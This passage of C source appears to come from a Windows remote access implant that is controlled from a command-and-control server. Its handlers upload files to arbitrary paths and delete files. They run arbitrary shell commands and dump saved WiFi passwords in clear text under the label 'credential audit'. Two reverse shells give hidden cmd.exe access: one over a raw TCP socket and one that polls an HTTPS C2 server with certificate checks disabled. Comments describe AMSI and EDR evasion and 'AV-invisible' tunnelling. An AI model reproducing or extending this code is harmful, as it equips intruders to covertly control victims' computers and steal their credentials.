  strncpy(ctx->task_id, task_id, sizeof(ctx->task_id) - 1);

  pthread_t tid;
  pthread_create(&tid, NULL, download_thread_func, ctx);
  pthread_detach(tid);

  return strdup(
      "{\"type\":\"text\",\"data\":{\"text\":\"Chunked download started\"}}");
}

char *cmd_upload_chunk(const char *json_args) {
  struct json_object *parsed = json_tokener_parse(json_args);
  if (!parsed)
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Invalid JSON args\"}}");

  struct json_object *f_obj, *idx_obj, *hash_obj, *data_obj;
  json_object_object_get_ex(parsed, "filename", &f_obj);
  json_object_object_get_ex(parsed, "chunk_index", &idx_obj);
  json_object_object_get_ex(parsed, "hash", &hash_obj);
  json_object_object_get_ex(parsed, "data", &data_obj);

  const char *filename = json_object_get_string(f_obj);
  const char *b64data = json_object_get_string(data_obj);
  const char *expected_hash = json_object_get_string(hash_obj);
  int chunk_index = json_object_get_int(idx_obj);

  int len;
  unsigned char *data = base64_decode(b64data, &len);
  if (!data) {
    json_object_put(parsed);
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Invalid base64 chunk\"}}");
  }

  // Verify SHA-256 using Windows CryptoAPI (no OpenSSL needed)
  unsigned char hash[32]; // SHA-256 is always 32 bytes
  unsigned int hash_len = 32;
  HCRYPTPROV hProv = 0;
  HCRYPTHASH hHash = 0;
  CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
  CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
  if (len > 0)
    CryptHashData(hHash, data, len, 0);
  DWORD cbHash = 32;
  CryptGetHashParam(hHash, HP_HASHVAL, hash, &cbHash, 0);
  hash_len = cbHash;
  CryptDestroyHash(hHash);
  CryptReleaseContext(hProv, 0);

  char hash_str[65] = {0};
  for (unsigned int j = 0; j < hash_len; j++) {
    sprintf(hash_str + (j * 2), "%02x", hash[j]);
  }

  if (strcmp(hash_str, expected_hash) != 0) {
    free(data);
    json_object_put(parsed);
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Hash mismatch on chunk\"}}");
  }

  char path[1024];
  if (filename[0] == '/' || (filename[0] && filename[1] == ':')) {
    strncpy(path, filename, sizeof(path) - 1);
  } else {
    snprintf(path, sizeof(path), "%s/%s", current_dir, filename);
  }

  const char *mode = (chunk_index == 0) ? "wb" : "ab";
  FILE *f = fopen(path, mode);
  if (!f) {
    free(data);
    json_object_put(parsed);
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Cannot open file "
                  "for writing\"}}");
  }

  fwrite(data, 1, len, f);
  fclose(f);
  free(data);
  json_object_put(parsed);

  char msg[256];
  snprintf(msg, sizeof(msg), "Chunk %d received and verified", chunk_index);
  struct json_object *ret_obj = json_object_new_object();
  json_object_object_add(ret_obj, "text", json_object_new_string(msg));
  char *res = make_result("text", ret_obj);
  json_object_put(ret_obj);
  return res;
}

// File upload
char *cmd_upload(const char *filename, const char *b64data) {
  unsigned char *data;
  int len;
  data = base64_decode(b64data, &len);
  if (!data) {
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Invalid base64 data\"}}");
  }
  char path[1024];
  if (filename[0] == '/' || (filename[0] && filename[1] == ':')) {
    snprintf(path, sizeof(path), "%s", filename);
  } else {
    snprintf(path, sizeof(path), "%s/%s", current_dir, filename);
  }
  FILE *f = fopen(path, "wb");
  if (!f) {
    free(data);
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Cannot write file\"}}");
  }
  fwrite(data, 1, len, f);
  fclose(f);
  free(data);
  char msg[256];
  snprintf(msg, sizeof(msg), "File %s uploaded (%d bytes)", filename, len);
  struct json_object *data_obj = json_object_new_object();
  json_object_object_add(data_obj, "text", json_object_new_string(msg));
  char *res = make_result("text", data_obj);
  json_object_put(data_obj);
  return res;
}

// Delete File or Folder
char *cmd_file_delete(const char *path) {
#ifdef _WIN32
  if (DeleteFileA(path) || RemoveDirectoryA(path) || remove(path) == 0) {
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Deleted successfully\"}}");
  }
#else
  if (remove(path) == 0) {
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Deleted successfully\"}}");
  }
#endif
  return strdup("{\"type\":\"error\",\"data\":\"Failed to delete\"}");
}

// Create Directory
char *cmd_folder_create(const char *path) {
#ifdef _WIN32
  if (CreateDirectoryA(path, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Folder created\"}}");
  }
#endif
  return strdup("{\"type\":\"error\",\"data\":\"Failed to create folder\"}");
}

// Create File
char *cmd_file_create(const char *path) {
  FILE *f = fopen(path, "ab");
  if (f) {
    fclose(f);
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"File created "
                  "successfully\"}}");
  }
  return strdup("{\"type\":\"error\",\"data\":\"Failed to create file\"}");
}

// Rename File or Folder
char *cmd_file_rename(const char *old_path, const char *new_path) {
  if (rename(old_path, new_path) == 0) {
    return strdup(
        "{\"type\":\"text\",\"data\":{\"text\":\"Renamed successfully\"}}");
  }
  return strdup("{\"type\":\"error\",\"data\":\"Failed to rename\"}");
}

// Ping
char *cmd_ping(const char *host) {
  char cmd[256];
#ifdef _WIN32
  snprintf(cmd, sizeof(cmd), "ping -n 4 %s", host);
#else
  snprintf(cmd, sizeof(cmd), "ping -c 4 %s", host);
#endif
  FILE *fp = popen(cmd, "r");
  if (!fp) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Ping failed\"}}");
  }
  char output[4096] = {0};
  char line[256];
  while (fgets(line, sizeof(line), fp)) {
    strncat(output, line, sizeof(output) - strlen(output) - 1);
  }
  pclose(fp);
  struct json_object *data = json_object_new_object();
  json_object_object_add(data, "text", json_object_new_string(output));
  char *res = make_result("text", data);
  json_object_put(data);
  return res;
}

// Ipconfig / ifconfig
char *cmd_ipconfig() {
  char cmd[64];
#ifdef _WIN32
  strcpy(cmd, "ipconfig /all");
#else
  strcpy(cmd, "ifconfig -a");
#endif
  FILE *fp = popen(cmd, "r");
  if (!fp) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Command failed\"}}");
  }
  char output[4096] = {0};
  char line[256];
  while (fgets(line, sizeof(line), fp)) {
    strncat(output, line, sizeof(output) - strlen(output) - 1);
  }
  pclose(fp);
  struct json_object *data = json_object_new_object();
  json_object_object_add(data, "text", json_object_new_string(output));
  char *res = make_result("text", data);
  json_object_put(data);
  return res;
}

// Location (ip-api.com) - uses WinHTTP (no libcurl needed)
char *cmd_location() {
#ifdef _WIN32
  HINTERNET hSes =
      WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSes)
    goto loc_fail;
  HINTERNET hCon =
      WinHttpConnect(hSes, L"ip-api.com", INTERNET_DEFAULT_HTTP_PORT, 0);
  if (!hCon) {
    WinHttpCloseHandle(hSes);
    goto loc_fail;
  }
  HINTERNET hReq =
      WinHttpOpenRequest(hCon, L"GET", L"/json/", NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  if (!hReq) {
    WinHttpCloseHandle(hCon);
    WinHttpCloseHandle(hSes);
    goto loc_fail;
  }
  WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                     WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
  WinHttpReceiveResponse(hReq, NULL);
  char loc_buf[4096] = {0};
  DWORD loc_read = 0, loc_total = 0;
  while (WinHttpReadData(hReq, loc_buf + loc_total,
                         sizeof(loc_buf) - loc_total - 1, &loc_read) &&
         loc_read > 0)
    loc_total += loc_read;
  WinHttpCloseHandle(hReq);
  WinHttpCloseHandle(hCon);
  WinHttpCloseHandle(hSes);
  struct json_object *data = json_tokener_parse(loc_buf);
  if (!data)
    data = json_object_new_object();
  char *res_str = make_result("location", data);
  json_object_put(data);
  return res_str;
loc_fail:
#endif
{
  struct json_object *data = json_object_new_object();
  char *res_str = make_result("location", data);
  json_object_put(data);
  return res_str;
}
}

// Credential audit (simulated)
char *cmd_cred_audit() {
  struct json_object *data = json_object_new_object();
  struct json_object *wifi = json_object_new_array();
#ifdef _WIN32
  // Dump WiFi profiles
  FILE *fp = _popen("netsh wlan show profiles", "r");
  if (fp) {
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
      if (strstr(line, "All User Profile")) {
        char *start = strchr(line, ':');
        if (start) {
          start += 2;
          char *end = strchr(start, '\r');
          if (end)
            *end = 0;
          char cmd2[512];
          snprintf(cmd2, sizeof(cmd2),
                   "netsh wlan show profile name=\"%s\" key=clear", start);
          FILE *fp2 = _popen(cmd2, "r");
          if (fp2) {
            char line2[256];
            char key[128] = "";
            while (fgets(line2, sizeof(line2), fp2)) {
              if (strstr(line2, "Key Content")) {
                char *k = strchr(line2, ':');
                if (k) {
                  k += 2;
                  strcpy(key, k);
                }
              }
            }
            _pclose(fp2);
            struct json_object *w = json_object_new_object();
            json_object_object_add(w, "ssid", json_object_new_string(start));
            json_object_object_add(w, "key", json_object_new_string(key));
            json_object_array_add(wifi, w);
          }
        }
      }
    }
    _pclose(fp);
  }
#endif
  json_object_object_add(data, "wifi", wifi);
  char *res = make_result("creds", data);
  json_object_put(data);
  return res;
}

// Generic shell command
char *cmd_shell(const char *cmd_line) {
  char wrapped_cmd[2048];
#ifdef _WIN32
  // Windows `popen` requires cmd.exe explicitly to handle shell built-ins
  // Use /Q to turn off echo and prevent interactive confirmation hangs
  snprintf(wrapped_cmd, sizeof(wrapped_cmd), "cmd.exe /Q /c \"%s\" 2>&1",
           cmd_line);
  FILE *fp = _popen(wrapped_cmd, "r");
#else
  snprintf(wrapped_cmd, sizeof(wrapped_cmd), "%s 2>&1", cmd_line);
  FILE *fp = popen(wrapped_cmd, "r");
#endif

  if (!fp) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Command execution "
                  "failed\"}}");
  }
  char output[16384] = {0}; // Increased buffer for safety
  char line[512];
  while (fgets(line, sizeof(line), fp)) {
    if (strlen(output) + strlen(line) < sizeof(output) - 1) {
      strcat(output, line);
    }
  }
#ifdef _WIN32
  int status = _pclose(fp);
#else
  int status = pclose(fp);
#endif

  if (strlen(output) == 0) {
    strcpy(output, "(No output)");
  }
  struct json_object *data = json_object_new_object();
  json_object_object_add(data, "text", json_object_new_string(output));
  char *res = make_result("text", data);
  json_object_put(data);
  return res;
}

// Change directory
char *cmd_cd(const char *args) {
  if (args && args[0]) {
    // chdir() handles absolute paths, relative paths, and ".." natively.
    // Do NOT manually concatenate current_dir – that double-resolves ".."
    if (chdir(args) == 0) {
      getcwd(current_dir, sizeof(current_dir));
      char msg[1024];
      snprintf(msg, sizeof(msg), "Changed to %s", current_dir);
      struct json_object *data = json_object_new_object();
      json_object_object_add(data, "text", json_object_new_string(msg));
      char *res = make_result("text", data);
      json_object_put(data);
      return res;
    } else {
      char msg[512];
      snprintf(msg, sizeof(msg), "cd: %s: %s", args, strerror(errno));
      struct json_object *data = json_object_new_object();
      json_object_object_add(data, "text", json_object_new_string(msg));
      char *res = make_result("text", data);
      json_object_put(data);
      return res;
    }
  } else {
    // Bare "cd" with no args: return current path (same format so GUI syncs
    // prompt)
    getcwd(current_dir, sizeof(current_dir));
    char msg[1024];
    snprintf(msg, sizeof(msg), "Changed to %s", current_dir);
    struct json_object *data = json_object_new_object();
    json_object_object_add(data, "text", json_object_new_string(msg));
    char *res = make_result("text", data);
    json_object_put(data);
    return res;
  }
}

// =====================================================================
// Reverse Shell – TCP transport (FUD/LOTL hardened)
// EDR evasion:
//   1. NO socket handle inheritance – uses anonymous pipe proxy threads
//   2. PowerShell LOLBin (signed, whitelisted MS binary)
//   3. Shell binary path resolved at runtime via GetSystemDirectory()
//   4. Char-array-built argv – no single static cmdline string
//   5. AMSI bypass injected as first command automatically
// =====================================================================
#ifdef _WIN32

// ── ConPTY-based reverse shell (Windows 10 1809+) ─────────────────────────
// Globals so cmd_revshell_stop() can kill the running session
static HPCON _rs_hPC = NULL;
static HANDLE _rs_proc = NULL;
#ifdef USE_OPENSSL
static SSL *_rs_ssl = NULL;
#else
static void *_rs_ssl = NULL;
#endif
static SOCKET _rs_sock = INVALID_SOCKET;

#ifdef USE_OPENSSL
// Context for the two ConPTY proxy threads
typedef struct {
  SSL *ssl;
  SOCKET sock;
  HANDLE pipe_read;  // read ConPTY output → send to C2
  HANDLE pipe_write; // receive C2 input → write to ConPTY
} _tcp_proxy_ctx_t;

// Thread: Single thread to proxy ConPTY I/O <-> TLS Socket safely
static DWORD WINAPI _tcp_pty_proxy(LPVOID param) {
  _tcp_proxy_ctx_t *ctx = (_tcp_proxy_ctx_t *)param;
  char buf[4096];

  // Set OpenSSL socket to non-blocking to prevent SSL_read from hanging
  u_long mode = 1;
  ioctlsocket(ctx->sock, FIONBIO, &mode);

  while (1) {
    int active = 0;

    // 1. Check if ConPTY has output
    DWORD avail = 0;
    if (PeekNamedPipe(ctx->pipe_read, NULL, 0, NULL, &avail, NULL)) {
      if (avail > 0) {
        DWORD r;
        if (ReadFile(ctx->pipe_read, buf, sizeof(buf), &r, NULL) && r > 0) {
          int w = SSL_write(ctx->ssl, buf, (int)r);
          if (w <= 0) {
            int err = SSL_get_error(ctx->ssl, w);
            if (err == SSL_ERROR_SYSCALL) {
              int wsa_err = WSAGetLastError();
              if (wsa_err != WSAEWOULDBLOCK && wsa_err != 0) {
                printf("[RS-TCP] SSL_write syscall error: %d\n", wsa_err);
                break;
              }
            } else if (err != SSL_ERROR_WANT_READ &&
                       err != SSL_ERROR_WANT_WRITE) {
              printf("[RS-TCP] SSL_write fatal error: %d\n", err);
              break; // fatal
            }
          } else {
            active = 1;
          }
        } else {
          printf("[RS-TCP] ReadFile failed on pipe\n");
          break; // Pipe closed
        }
      }
    } else {
      printf("[RS-TCP] PeekNamedPipe failed (shell closed?)\n");
      break; // Pipe closed
    }

    // 2. Check Socket for input
    int n = SSL_read(ctx->ssl, buf, sizeof(buf));
    if (n > 0) {
      DWORD w;
      WriteFile(ctx->pipe_write, buf, (DWORD)n, &w, NULL);
      active = 1;
    } else {
      int err = SSL_get_error(ctx->ssl, n);
      if (err == SSL_ERROR_SYSCALL) {
        int wsa_err = WSAGetLastError();
        if (wsa_err != WSAEWOULDBLOCK && wsa_err != 0) {
          printf("[RS-TCP] SSL_read syscall error: %d\n", wsa_err);
          break;
        }
      } else if (err == SSL_ERROR_ZERO_RETURN) {
        printf("[RS-TCP] SSL_read connection closed gracefully\n");
        break;
      } else if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) {
        printf("[RS-TCP] SSL_read fatal err=%d wsa=%d\n", err,
               WSAGetLastError());
        break; // Connection closed
      }
    }

    // Sleep if idle to prevent 100% CPU lock
    if (!active)
      Sleep(10);
  }

  printf("[RS-TCP] Proxy thread exiting gracefully.\n");
  // Restore blocking before close just in case
  mode = 0;
  ioctlsocket(ctx->sock, FIONBIO, &mode);

  SSL_free(ctx->ssl);
  closesocket(ctx->sock);
  CloseHandle(ctx->pipe_read);
  CloseHandle(ctx->pipe_write);
  free(ctx);
  return 0;
}

// Thread: Read from C2 socket \u2192 Write to shell stdin
static DWORD WINAPI _tcp_to_shell(LPVOID param) {
  _tcp_proxy_ctx_t *ctx = (_tcp_proxy_ctx_t *)param;
  char buf[4096];
  int n;
  while ((n = SSL_read(ctx->ssl, buf, sizeof(buf))) > 0) {
    DWORD w;
    WriteFile(ctx->pipe_write, buf, (DWORD)n, &w, NULL);
  }
  return 0;
}

// Thread: Read from shell stdout \u2192 Write to C2 socket
static DWORD WINAPI _shell_to_tcp(LPVOID param) {
  _tcp_proxy_ctx_t *ctx = (_tcp_proxy_ctx_t *)param;
  char buf[4096];
  DWORD r;
  while (ReadFile(ctx->pipe_read, buf, sizeof(buf), &r, NULL) && r > 0) {
    if (SSL_write(ctx->ssl, buf, (int)r) <= 0)
      break;
  }

  // Cleanup
  SSL_free(ctx->ssl);
  closesocket(ctx->sock);
  CloseHandle(ctx->pipe_read);
  free(ctx);
  return 0;
}
#endif // USE_OPENSSL

// ── TCP Reverse Shell ─────────────────────────────────────────────────────
// Fileless approach: runs a PowerShell .NET TcpClient one-liner in memory.
// No pipes, no ConPTY, no extra DLLs — pure LOLbin.
// The attacker listens with: nc -lvnp PORT (or rlwrap nc -lvnp PORT)
//
// FUTURE: GUI-integrated ConPTY shell via WebSocket bridging when needed.
char *cmd_revshell_tcp(const char *ip, int port) {
  printf("[RS-TCP] Launching fileless PS reverse shell \u2192 %s:%d\n", ip,
         port);

  // INSTEAD of using powershell.exe which gives Defender heuristics (even
  // with AMSI bypass), we do exactly what RAMP's tcp.go does: Native Winsock
  // reverse shell to cmd.exe. This is completely fileless, requires no
  // execution policy bypass, and avoids AMSI entirely.

  SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  if (sock == INVALID_SOCKET) {
    char *r = make_result("error", json_object_new_string("WSASocket failed"));
    return r;
  }

  struct sockaddr_in server;
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = inet_addr(ip);
  server.sin_port = htons(port);

  if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL,
                 NULL) == SOCKET_ERROR) {
    DWORD err = WSAGetLastError();
    printf("[RS-TCP] WSAConnect failed: %lu\n", err);
    char em[64];
    snprintf(em, sizeof(em), "TCP Connect failed (%lu)", err);
    char *r = make_result("error", json_object_new_string(em));
    closesocket(sock);
    return r;
  }

  // Bind the socket directly to cmd.exe's stdio Handles
  STARTUPINFO si;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  // Cast SOCKET to HANDLE for I/O redirection
  si.hStdInput = (HANDLE)sock;
  si.hStdOutput = (HANDLE)sock;
  si.hStdError = (HANDLE)sock;
  si.wShowWindow = SW_HIDE;

  PROCESS_INFORMATION pi;
  memset(&pi, 0, sizeof(pi));

  char cmd_path[MAX_PATH];
  GetSystemDirectory(cmd_path, sizeof(cmd_path));
  strncat(cmd_path, "\\cmd.exe", sizeof(cmd_path) - strlen(cmd_path) - 1);

  if (!CreateProcessA(NULL, cmd_path, NULL, NULL,
                      TRUE, // TRUE is required for handle inheritance
                      CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si,
                      &pi)) {
    DWORD err = GetLastError();
    printf("[RS-TCP] CreateProcess cmd.exe failed: %lu\n", err);
    char em[64];
    snprintf(em, sizeof(em), "revshell tcp spawn failed (%lu)", err);
    char *r = make_result("error", json_object_new_string(em));
    closesocket(sock);
    return r;
  }
  printf("[RS-TCP] PS reverse shell spawned PID=%lu\n", pi.dwProcessId);
  CloseHandle(pi.hThread);

  // Save process handle so revshell_stop can kill it
  _rs_hPC = NULL;
  _rs_ssl = NULL;
  _rs_sock = INVALID_SOCKET;
  _rs_proc = pi.hProcess;

  char msg[192];
  snprintf(msg, sizeof(msg),
           "Fileless PS reverse shell spawned \u2192 listen with: nc -lvnp %d",
           port);
  struct json_object *d = json_object_new_object();
  json_object_object_add(d, "text", json_object_new_string(msg));
  char *r = make_result("text", d);
  json_object_put(d);
  return r;
}

// Kill the active rev shell session (called by revshell_stop command)
char *cmd_revshell_stop(void) {
  printf("[RS-TCP] Stopping active session...\n");
  if (_rs_proc) {
    TerminateProcess(_rs_proc, 0);
    CloseHandle(_rs_proc);
    _rs_proc = NULL;
  }
  if (_rs_hPC) {
    typedef void(WINAPI * pfnClosePseudoConsole)(HPCON);
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    pfnClosePseudoConsole myClosePseudoConsole =
        (pfnClosePseudoConsole)GetProcAddress(hKernel32, "ClosePseudoConsole");
    if (myClosePseudoConsole) {
      myClosePseudoConsole(_rs_hPC);
    }
    _rs_hPC = NULL;
  }
#ifdef USE_OPENSSL
  if (_rs_ssl) {
    SSL_shutdown(_rs_ssl);
    SSL_free(_rs_ssl);
    _rs_ssl = NULL;
  }
#endif
  if (_rs_sock != INVALID_SOCKET) {
    closesocket(_rs_sock);
    _rs_sock = INVALID_SOCKET;
  }
  printf("[RS-TCP] Session terminated\n");
  struct json_object *d = json_object_new_object();
  json_object_object_add(
      d, "text", json_object_new_string("Reverse shell session terminated"));
  char *r = make_result("text", d);
  json_object_put(d);
  return r;
}
#endif

#ifdef USE_CURL
// =====================================================================
// Reverse Shell – HTTPS polling transport
// Shell runs locally; stdout is POSTed to C2; keystrokes are polled.
// Fully tunneled over existing TLS libcurl channel → AV-invisible.
// =====================================================================
#ifdef _WIN32
typedef struct {
  char session_id[64];
  char c2_url[256];
} https_revshell_ctx_t;
static HANDLE https_shell_in_write = NULL;
static HANDLE https_shell_out_read = NULL;

static DWORD WINAPI https_revshell_output_thread(LPVOID param) {
  https_revshell_ctx_t *ctx = (https_revshell_ctx_t *)param;
  char out_url[512];
  snprintf(out_url, sizeof(out_url), "%s/api/revshell/output/%s", ctx->c2_url,
           ctx->session_id);

  char buf[4096];
  DWORD read_bytes;
  while (
      ReadFile(https_shell_out_read, buf, sizeof(buf) - 1, &read_bytes, NULL) &&
      read_bytes > 0) {
    buf[read_bytes] = '\0';
    CURL *curl = curl_easy_init();
    if (curl) {
      curl_easy_setopt(curl, CURLOPT_URL, out_url);
      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);
      curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)read_bytes);
      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
      curl_easy_perform(curl);
      curl_easy_cleanup(curl);
    }
  }
  free(ctx);
  return 0;
}

typedef struct {
  char *memory;
  size_t size;
} MemoryStruct;

static size_t https_poll_write_mem_cb(void *contents, size_t size, size_t nmemb,
                                      void *userp) {
  size_t realsize = size * nmemb;
  MemoryStruct *mem = (MemoryStruct *)userp;

  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
  if (!ptr) {
    return 0; // out of memory!
  }

  mem->memory = ptr;
  memcpy(&(mem->memory[mem->size]), contents, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;

  return realsize;
}

static DWORD WINAPI https_revshell_input_thread(LPVOID param) {
  https_revshell_ctx_t *ctx = (https_revshell_ctx_t *)param;
  char poll_url[512];
  snprintf(poll_url, sizeof(poll_url), "%s/api/revshell/poll/%s", ctx->c2_url,
           ctx->session_id);

  while (1) {
    CURL *curl = curl_easy_init();
    if (curl) {
      MemoryStruct chunk;
      chunk.memory = malloc(1); // will be grown as needed by the realloc
      chunk.size = 0;

      curl_easy_setopt(curl, CURLOPT_URL, poll_url);
      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, https_poll_write_mem_cb);
      curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

      CURLcode res = curl_easy_perform(curl);
      if (res == CURLE_OK && chunk.size > 0) {
        // Parse {"data":"..."} and write to shell stdin
        struct json_object *j = json_tokener_parse(chunk.memory);
        if (j) {
          struct json_object *d;
          if (json_object_object_get_ex(j, "data", &d)) {
            const char *input = json_object_get_string(d);
            if (input && strlen(input) > 0) {
              DWORD written;
              WriteFile(https_shell_in_write, input, (DWORD)strlen(input),
                        &written, NULL);
            }
          }
          json_object_put(j);
        }
      }
      free(chunk.memory);
      curl_easy_cleanup(curl);
    }
    Sleep(300);
  }
  return 0;
}

char *cmd_revshell_https(const char *session_id, const char *c2_url) {
  printf("[RS-HTTPS] Starting HTTPS reverse shell → session=%s c2=%s\n",
         session_id, c2_url);

  char shell_path[MAX_PATH] = {0};
  GetSystemDirectory(shell_path, sizeof(shell_path));
  char seg[] = {'\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', '\0'};
  strncat(shell_path, seg, sizeof(shell_path) - strlen(shell_path) - 1);
  printf("[RS-HTTPS] Shell path: %s\n", shell_path);

  HANDLE hInRead, hInWrite, hOutRead, hOutWrite;
  SECURITY_ATTRIBUTES sa_attr = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
  CreatePipe(&hInRead, &hInWrite, &sa_attr, 0);
  CreatePipe(&hOutRead, &hOutWrite, &sa_attr, 0);
  SetHandleInformation(hInWrite, HANDLE_FLAG_INHERIT, 0);
  SetHandleInformation(hOutRead, HANDLE_FLAG_INHERIT, 0);
  printf("[RS-HTTPS] Pipes created OK\n");

  https_shell_in_write = hInWrite;
  https_shell_out_read = hOutRead;

  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = hInRead;
  si.hStdOutput = hOutWrite;
  si.hStdError = hOutWrite;

  printf("[RS-HTTPS] Spawning cmd.exe /Q ...\n");
  char args[] = " /Q";
  if (!CreateProcessA(shell_path, args, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                      NULL, NULL, &si, &pi)) {
    printf("[RS-HTTPS] ERROR: CreateProcessA failed (code %lu)\n",
           GetLastError());
    CloseHandle(hInRead);
    CloseHandle(hInWrite);
    CloseHandle(hOutRead);
    CloseHandle(hOutWrite);
    struct json_object *d = json_object_new_object();
    char emsg[128];
    snprintf(emsg, sizeof(emsg),
             "revshell https: CreateProcess failed (code %lu)", GetLastError());
    json_object_object_add(d, "text", json_object_new_string(emsg));
    char *r = make_result("error", d);
    json_object_put(d);
    return r;
  }
  printf("[RS-HTTPS] cmd.exe spawned OK (PID=%lu)\n", pi.dwProcessId);
  CloseHandle(hInRead);
  CloseHandle(hOutWrite);
  CloseHandle(pi.hThread);
  CloseHandle(pi.hProcess);

  // Launch I/O threads
  printf("[RS-HTTPS] Starting output/input polling threads ...\n");
  https_revshell_ctx_t *ctx_out = malloc(sizeof(https_revshell_ctx_t));
  https_revshell_ctx_t *ctx_in = malloc(sizeof(https_revshell_ctx_t));
  strncpy(ctx_out->session_id, session_id, sizeof(ctx_out->session_id) - 1);
  strncpy(ctx_out->c2_url, c2_url, sizeof(ctx_out->c2_url) - 1);
  strncpy(ctx_in->session_id, session_id, sizeof(ctx_in->session_id) - 1);
  strncpy(ctx_in->c2_url, c2_url, sizeof(ctx_in->c2_url) - 1);
  CreateThread(NULL, 0, https_revshell_output_thread, ctx_out, 0, NULL);
  CreateThread(NULL, 0, https_revshell_input_thread, ctx_in, 0, NULL);
  printf("[RS-HTTPS] Threads running — shell active\n");

  char msg[256];
  snprintf(msg, sizeof(msg),
           "HTTPS reverse shell started → session %s [ACTIVE]", session_id);
  struct json_object *d = json_object_new_object();
  json_object_object_add(d, "text", json_object_new_string(msg));
  char *r = make_result("text", d);
  json_object_put(d);
  return r;
}
#endif
#endif // USE_CURL

// Interactive Shell Start
char *cmd_shell_start() {
#ifdef _WIN32
  if (interactive_shell_active) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Interactive shell "
                  "already running\"}}");
  }

  SECURITY_ATTRIBUTES sa;
  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = TRUE;
  sa.lpSecurityDescriptor = NULL;

  HANDLE hShellInRead = NULL;
  HANDLE hShellOutWrite = NULL;

  if (!CreatePipe(&hShellOutRead, &hShellOutWrite, &sa, 0))
    return strdup("{\"type\":\"error\",\"data\":\"Pipe failed\"}");
  if (!CreatePipe(&hShellInRead, &hShellInWrite, &sa, 0))
    return strdup("{\"type\":\"error\",\"data\":\"Pipe failed\"}");

  SetHandleInformation(hShellOutRead, HANDLE_FLAG_INHERIT, 0);
  SetHandleInformation(hShellInWrite, HANDLE_FLAG_INHERIT, 0);

  PROCESS_INFORMATION pi;
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

  STARTUPINFOA si;
  ZeroMemory(&si, sizeof(STARTUPINFOA));
  si.cb = sizeof(STARTUPINFOA);
  si.hStdError = hShellOutWrite;
  si.hStdOutput = hShellOutWrite;
  si.hStdInput = hShellInRead;
  si.dwFlags |= STARTF_USESTDHANDLES;

  char cmd[] = "powershell.exe -NoExit -Command -";

  if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
                      current_dir, &si, &pi)) {
    return strdup("{\"type\":\"error\",\"data\":\"Failed to create process\"}");
  }

  hShellProcess = pi.hProcess;
  CloseHandle(pi.hThread);
  CloseHandle(hShellOutWrite);
  CloseHandle(hShellInRead);

  interactive_shell_active = 1;
  return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Interactive "
                "PowerShell started. "
                "Type 'shell_stop' to exit burst mode.\"}}");
#else
  return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Interactive shell not "
                "supported yet\"}}");
#endif
}

// Interactive Shell Stop
char *cmd_shell_stop() {
#ifdef _WIN32
  if (!interactive_shell_active) {
    return strdup("{\"type\":\"text\",\"data\":{\"text\":\"No interactive "
                  "shell running\"}}");
  }
  TerminateProcess(hShellProcess, 0);
  CloseHandle(hShellProcess);
  CloseHandle(hShellInWrite);
  CloseHandle(hShellOutRead);
  interactive_shell_active = 0;
  return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Interactive "
                "PowerShell stopped.\"}}");
#else
  return strdup("{\"type\":\"text\",\"data\":{\"text\":\"Interactive shell not "
                "supported yet\"}}");
#endif
}

// Interactive Shell Input
char *cmd_shell_input(const char *input) {
#ifdef _WIN32
  if (!interactive_shell_active) {
